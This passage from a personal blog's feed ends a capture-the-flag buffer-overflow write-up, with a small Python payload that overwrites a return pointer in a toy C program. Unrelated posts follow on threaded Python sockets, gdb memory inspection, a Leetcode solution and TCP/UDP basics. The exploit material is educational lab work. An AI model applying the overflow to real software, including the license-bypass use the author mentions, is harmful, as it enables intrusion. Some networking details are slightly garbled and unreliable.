<span class="token number">40</span>   <span class="token comment" spellcheck="true"># the output of pattern.py</span>rp <span class="token operator">=</span> <span class="token string">"\xe4\x06\x00\x08\x00\x00\x00\x00"</span>  <span class="token comment" spellcheck="true"># little endian 64-bit, the value that we want the RP to be</span>exploit <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offsetexploit <span class="token operator">+=</span> rpexploit <span class="token operator">+=</span> <span class="token string">'H'</span> <span class="token operator">*</span> <span class="token number">10</span><span class="token keyword">print</span><span class="token punctuation">(</span>exploit<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then:<br><img src="/2020/05/14/c-buffer-overflow-to-hijack-rp/found_hidden_func.png" alt="Execute overflow()"></p><hr><h3 id="Vulnerable-code"><a href="#Vulnerable-code" class="headerlink" title="Vulnerable code"></a>Vulnerable code</h3><p>If you are curious, the vulnerable code is:</p><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What is the secret word?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// this is dangerous, better scanf("%19s", data)</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">overflow</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"YaY! Flag is: guiltycrown"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>The lesson here for blue team is DON’T TRUST USER INPUT. It could lead to buffer overflows, code injection and remote code execution, not only for C: for Python, use <code>raw_input()</code> instead of <code>input()</code>; in PHP, avoid calling <code>eval()</code> directly on user input. In a nutshell, users should not be able to trigger code.</p><hr><p>Small note:</p><p>…</p><p>Really, this flag is easily found using <code>strings</code> command…<br>But it is worth it to learn how to execute arbitrary functions, as for example functions to bypass license verification. :)</p>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary exploitation </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python threads 1</title>
      <link href="/2020/05/14/python-threads-1/"/>
      <url>/2020/05/14/python-threads-1/</url>
      
        <content type="html"><![CDATA[<p>When a server socket accepts a connection, it creates a client socket to handle the communication with the other party. However, if the server code is not multithreaded, others cannot connect to the server when it is handling the previous request. For example:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socketserver <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># bind to socket.gethostname() so that it is reachable from the outside world, not 'localhost'</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># listen to 5 connections</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># create a clientsocket that communicates with the other clientsocket</span>  <span class="token punctuation">(</span>client<span class="token punctuation">,</span> address<span class="token punctuation">)</span> <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># do whatever with the created clientsocket, in this case, run the thread from client_thread</span>  client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'You are connected!'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By default, the socket is <strong>blocking</strong>, so the calls to <code>recv()</code> and <code>send()</code> are blocked until <code>recv()</code> finds data or <code>send()</code> disposes of data. We can set the socket to <strong>non-blocking mode</strong>, but that will raise an error in such cases. Here is where multithreading comes into play and increases efficiency. Two ways to do it: create a class that inherits from <code>threading.Thread</code>, or use <code>thread.start_new_thread()</code> for simple server code.</p><h3 id="Without-writing-a-new-class"><a href="#Without-writing-a-new-class" class="headerlink" title="Without writing a new class"></a>Without writing a new class</h3><p>For example, for <code>thread.start_new_thread()</code> define a function for the server behaviour, and pass the parameters in a tuple:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> thread<span class="token keyword">import</span> socket<span class="token comment" spellcheck="true"># code that handles a client connection</span><span class="token keyword">def</span> <span class="token function">handler</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">:</span>  client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"You are connected!"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Client from '</span> <span class="token operator">+</span> repr<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'> '</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>    <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token string">'bye'</span><span class="token punctuation">:</span>      client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Bye!'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>      client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'You said: '</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># initialize server socket</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># restrict to 100 connections</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token punctuation">(</span>client<span class="token punctuation">,</span> address<span class="token punctuation">)</span> <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># start a thread that calls the handler function</span>  thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>handler<span class="token punctuation">,</span> <span class="token punctuation">(</span>client<span class="token punctuation">,</span> address<span class="token punctuation">)</span><span class="token punctuation">)</span>server<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="With-a-new-class-that-inherits-from-Thread"><a href="#With-a-new-class-that-inherits-from-Thread" class="headerlink" title="With a new class that inherits from Thread"></a>With a new class that inherits from <code>Thread</code></h3><p>Or create a class that inherits from <code>Thread</code>:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span> threading<span class="token keyword">class</span> <span class="token class-name">ClientThread</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>clientAddress<span class="token punctuation">,</span>clientsocket<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>csocket <span class="token operator">=</span> clientsocket        self<span class="token punctuation">.</span>clientAddress <span class="token operator">=</span> clientAddress        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Client from: "</span><span class="token punctuation">,</span> clientAddress<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># called when thread starts</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> self<span class="token punctuation">.</span>csocket<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'> '</span> <span class="token operator">+</span> data<span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token operator">==</span><span class="token string">'bye'</span><span class="token punctuation">:</span>              self<span class="token punctuation">.</span>csocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'Bye!'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">break</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>              self<span class="token punctuation">.</span>csocket<span class="token punctuation">.</span>send<span class="token punctuation">(</span>bytes<span class="token punctuation">(</span><span class="token string">"You said:"</span> <span class="token operator">+</span> data<span class="token punctuation">,</span> <span class="token string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"Client at "</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>clientAddress <span class="token punctuation">,</span> <span class="token string">" disconnected..."</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>csocket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>LOCALHOST <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>PORT <span class="token operator">=</span> <span class="token number">8080</span>server <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>LOCALHOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Server started"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for client request..."</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    clientsock<span class="token punctuation">,</span> clientAddress <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># create a thread with a customized Thread class</span>    newthread <span class="token operator">=</span> ClientThread<span class="token punctuation">(</span>clientAddress<span class="token punctuation">,</span> clientsock<span class="token punctuation">)</span>    newthread<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Programming </category>
          
      </categories>
      
      
        <tags>
            
            <tag> concurrency </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Quick look into RAM with gdb: Stack &amp; Heap</title>
      <link href="/2020/05/14/quick-look-into-ram-with-gdb-stack-heap/"/>
      <url>/2020/05/14/quick-look-into-ram-with-gdb-stack-heap/</url>
      
        <content type="html"><![CDATA[<p>The RAM (random access memory) stores volatile data that is being used by current processes. It is divided into two sections: <strong>stack</strong> and <strong>heap</strong>. Do not confuse them with the data structures with the same names.</p><h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><p>The data and instructions in a stack are <strong>structured</strong>. Every time a function is called, the variables and parameters are grouped in a <em>stack frame</em>. So recursive functions will create many stack frames. An important concept for binary exploitation is the <strong>return pointer (RP)</strong>. It has the value of <strong>EIP (instruction pointer)</strong> for when the stack frame was created, so when the function returns the program will come back to the piece of code that called the function. The <strong>RP</strong> is located at the bottom of the stack frame, so the size of the stack frame is delimited (that’s why is structured, as order and size matters).</p><h2 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h2><p>Unlike the stack, the heap is an unstructured area to store data, but access to it is slower. The advantage is that there is no need to know the size of the data beforehand.</p><h2 id="Practical-a-deeper-look-with-gdb"><a href="#Practical-a-deeper-look-with-gdb" class="headerlink" title="Practical: a deeper look with gdb"></a>Practical: a deeper look with gdb</h2><p>Here we will use GDB debugger enhanced with <a href="https://github.com/pwndbg/pwndbg" target="_blank" rel="noopener">pwngdb</a> as a debugger for C compiled program. It is absolutely a key skill in binary exploitation to be familiar with gdb. Pay attention to what is loaded in registers EIP and ESP (Stack pointer), identify the heap data, and the return pointer (RP).</p><pre class="line-numbers language-bash"><code class="language-bash">gdb ./hijackRPpwngdb<span class="token operator">></span> <span class="token keyword">break</span> *mainpwngdb<span class="token operator">></span> run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2020/05/14/quick-look-into-ram-with-gdb-stack-heap/info.png" alt="GDB: look into data and instructions (1)"></p><p><img src="/2020/05/14/quick-look-into-ram-with-gdb-stack-heap/info2.png" alt="GDB: look into data and instructions (2)"></p>]]></content>
      
      
      <categories>
          
          <category> Hacking </category>
          
      </categories>
      
      
        <tags>
            
            <tag> memory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode 141: Linked List Cycle using slow-fast pointers</title>
      <link href="/2020/05/14/leetcode-141-linked-list-cycle-using-slow-fast-pointers/"/>
      <url>/2020/05/14/leetcode-141-linked-list-cycle-using-slow-fast-pointers/</url>
      
        <content type="html"><![CDATA[<h2 id="Leetcode-141-Linked-List-Cycle-Easy"><a href="#Leetcode-141-Linked-List-Cycle-Easy" class="headerlink" title="Leetcode 141: Linked List Cycle Easy."></a>Leetcode 141: <a href="https://leetcode.com/problems/linked-list-cycle/" target="_blank" rel="noopener">Linked List Cycle</a> Easy.</h2><blockquote><p>Given a linked list, determine if it has a cycle in it.</p></blockquote><blockquote><p>To represent a cycle in the given linked list, we use an integer pos which represents the position (0-indexed) in the linked list where tail connects to. If pos is -1, then there is no cycle in the linked list.</p></blockquote><p>Let’s solve it step by step. If there are no cycles, then it will reach <code>null</code> at some point during traversal, then return <code>false</code>.</p><p>If there is a cycle, <code>null</code> will never be reached, so we need another condition to end. Because a cycle is closed, a pointer will eventually point to the same node again over time, so this is a good place to use <strong>slow-fast pointers</strong> strategy. The <code>fast</code> pointer moves 2 steps each iteration, while <code>slow</code> advances 1 step. If they reencounter (pointing to the same object), then it is only possible if there is a cycle. Else if any of them reaches <code>null</code>, return <code>false</code>.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// fast slow pointers</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasCycle</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> null <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>        ListNode fast <span class="token operator">=</span> head<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        ListNode slow <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>slow <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token comment" spellcheck="true">// they must reencounter at some point because slow moves 1 at a time, and 1 is a divisor</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>slow <span class="token operator">==</span> fast<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token comment" spellcheck="true">// move 1 step</span>            slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// move 2 steps</span>            fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// whenever null is reached by any pointer means there is an end</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Time-and-space-complexity"><a href="#Time-and-space-complexity" class="headerlink" title="Time and space complexity"></a>Time and space complexity</h4><p><strong>Time: O(n)</strong></p><p>If the whole linked list is a cycle, then at least the slow pointer has to move <code>n/2</code> steps before the fast pointer starts again.</p><p><strong>Space: O(1)</strong></p><p>This method only uses two pointers.</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> slow-fast pointers </tag>
            
            <tag> Linked List </tag>
            
            <tag> algorithms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TCP and UDP: Transport Layer Protocols</title>
      <link href="/2020/05/12/tcp-and-udp/"/>
      <url>/2020/05/12/tcp-and-udp/</url>
      
        <content type="html"><![CDATA[<p>TCP and UDP are <strong>transport layer</strong> protocols (OSI layer 4). They are responsible for sending data from a source computer to a destination computer. They break the application data into <strong>packets</strong>, and each packet contains a piece of data and headers, which provide information from lower levels, for instance, IP (OSI layer 3: network layer). The way packets are handled and monitored is the main difference between TCP and UDP. As well, there is one set of port numbers for each of them: 0-1023 for UDP and other 0-1023 for TCP.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>A web server (computer A) sends an HTML file to a client (computer B), it uses the HTTP protocol and the HTTP layer asks the TCP layer to create a session between computer A and B. In the TCP layer, the data is divided into numbered packets, then they are forwarded individually to the IP layer.</p><h2 id="Difference-between-TCP-and-UDP"><a href="#Difference-between-TCP-and-UDP" class="headerlink" title="Difference between TCP and UDP"></a>Difference between TCP and UDP</h2><p>TCP sets up a session between A and B before communicating the data. This is because TCP ensures that no packets are lost or corrupted. By having a session, the recipient can check the correctness of the data with the sender, and it waits for receiving all the packets. Therefore, TCP is also part of the <strong>session layer</strong> (OSI layer 5). On the other hand, UDP is used for lossy transmissions, because there are no checks for data integrity, there may be some missing packets.</p><p>TCP is more reliable, but UDP is faster. Thus, TCP is used in tasks that require data integrity, like sending HTML files or form data, whereas UDP is used commonly in video sharing, where a few missing frames do not make a great difference.</p><p>In bullet points:</p><ol><li><strong>Connection</strong>. TCP needs to establish a connection, UDP not.</li><li><strong>Client-server interaction</strong>. TCP is one-to-one, UDP is one-to-one, one-to-many or many-to-many.</li><li><strong>Reliability</strong>. TCP ensures that data is not lost, not repeated and in order. No assurance in UDP.</li><li><strong>Congestion policies</strong>. TCP uses <strong>congestion window</strong> to manage network congestions. It states the maximum amount of data that can be sent out without receiving acknowledgement. It decreases when congestion is detected. UDP does not change its rate of sending in congestion.</li><li><strong>Header length</strong>. TCP header length is 20 bytes (or more if there are options), UDP header length is fixed to 8 bytes.</li></ol><p>Usecases:</p><ul><li><strong>TCP</strong>: FTP and HTTP/S</li><li><strong>UDP</strong>: DNS, SNMP, media, broadcast</li></ul><h2 id="TCP-in-detail"><a href="#TCP-in-detail" class="headerlink" title="TCP in detail"></a>TCP in detail</h2><h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p>According to RFC 793, a <em>connection</em> is a combination of information about sockets (IP and port), sequence numbers and window sizes. A <em>connection</em> is uniquely identified by <em>source IP</em>, <em>source port</em>, <em>destination IP</em> and <em>destination port</em>.</p><h3 id="Maximum-total-TCP-connections-for-a-server-endpoint"><a href="#Maximum-total-TCP-connections-for-a-server-endpoint" class="headerlink" title="Maximum total TCP connections for a server endpoint"></a>Maximum total TCP connections for a server endpoint</h3><p>Theoretically,</p><pre><code>Max TCP connections = Total num of client IPs * Total ports</code></pre><p>For IPv4, there are <code>2**32</code> IPs. And <code>2**16</code> ports.</p><p>Practically, there are limits, like memory limits. As well, every socket is a file, so the number of sockets can be limited with <code>ulimit</code> command in Linux. See <code>/etc/security/limits.conf</code>. It specifies the maximum number of files that a process can open.  </p><h3 id="TCP-handshake"><a href="#TCP-handshake" class="headerlink" title="TCP handshake"></a>TCP handshake</h3><p>It begins the conversation and consists of three steps:</p><pre><code>A -&gt; B        [SYN] seq=(a random num x), len=0B -&gt; A        [SYN, ACK] seq=(a random num y), ack=x+1, len=0A -&gt; B        [ACK] seq=x+1, ack=y+1, len=0</code></pre><p>Here only TCP headers are shown. <code>[SYN]</code> means that this flag is set, meaning the sender wants to begin a conversation. <code>[ACK]</code> means “acknowledge”, so it acknowledges that a previous packets was received. <code>seq</code> is the sequence number and <code>ack</code> is the acknowledge number. <code>len</code> is the length of the data in that packet, because in the handshaking process no data is actually sent, <code>len = 0</code>. The <code>seq</code> and <code>ack</code> are the key to check for possible lost packets.</p><p>We can see that <code>seq</code> is generated randomly when starting a conversation. Later, <code>seq</code> and <code>ack</code> are closely related. <code>seq</code> identifies the current flow for the sender itself, and <code>ack</code> is to tell the counterpart (the previous sender), that it has received a packet of a length that can be inferred from the last sequence number of the counterpart. This is how it works: <code>ack</code> takes the <code>seq</code> of the previous received packet + the length received, to acknowledge it has received a certain length; <code>seq</code> takes the <code>ack</code> of the previously received packet, because it identifies the current flow. So for example, if A last sent a packet with <code>seq</code>, but it received back a packet with <code>ack&lt;=seq</code>, then something is wrong.</p><p>Note: During TCP handshake, the <code>ack</code> is <code>seq+1</code> although <code>len=0</code>.</p><h3 id="TCP-transmission"><a href="#TCP-transmission" class="headerlink" title="TCP transmission"></a>TCP transmission</h3><p>During transmission, the recipient acknowledges that it has received successfully via an <code>[ACK]</code> packet.</p><pre><code>A -&gt; B        [PSH, ACK] seq=43, ack=23, len=12  eg. &quot;Hello World\n&quot; --&gt; 12 bytesB -&gt; A        [ACK] seq=23, ack=43+12=55, len=0</code></pre><h3 id="TCP-teardown"><a href="#TCP-teardown" class="headerlink" title="TCP teardown"></a>TCP teardown</h3><p>The session can end gracefully via <code>[FIN]</code> packets.</p><pre><code>A -&gt; B        [FIN, ACK] seq=13, ack=1, len=0B -&gt; A        [ACK] seq=1, ack=14, len=0......... B also does the same ..................B -&gt; B        [FIN, ACK] seq=1, ack=14, len=0A -&gt; B        [ACK] seq=14, ack=2, len=0</code></pre><p>A asks to end via a <code>[FIN]</code> packet, then B acknowledges that it has received that. However, triggered by the <code>[FIN]</code> packet, B also sends a <code>[FIN]</code> packet to A (provided B has not sent any <code>[FIN]</code> packets in this session).</p><p>If the session cannot be ended gracefully, the <code>[RST]</code> packet can be issued to end immediately.</p><h2 id="Practical-Python-socket-module"><a href="#Practical-Python-socket-module" class="headerlink" title="Practical: Python socket module"></a>Practical: <code>Python</code> <code>socket</code> module</h2><p>This module can be used to set a client socket and send TCP/UDP packets to a computer identified by the tuple (IP, port). Or it can also bind a service to a port, receive and send data.</p><p>A typical client socket:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token comment" spellcheck="true"># AF_INET for IPv4, AF_INET6 for IPv6; SOCK_STREAM for TCP, SOCK_DGRAM for UDP</span>client <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># connect to a server: "www.serverdomain.com"</span>client<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"localhost"</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># send and receive</span>client<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># decode bytes object</span><span class="token comment" spellcheck="true"># remember to close the connection</span>client<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>A simple server socket:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> socketserver <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># bind to socket.gethostname() so that it is reachable from the outside world, not 'localhost'</span>server<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span>socket<span class="token punctuation">.</span>gethostname<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># listen to 5 connections</span>server<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># create a clientsocket that communicates with the other clientsocket</span>  <span class="token punctuation">(</span>client<span class="token punctuation">,</span> address<span class="token punctuation">)</span> <span class="token operator">=</span> server<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># do whatever with the created 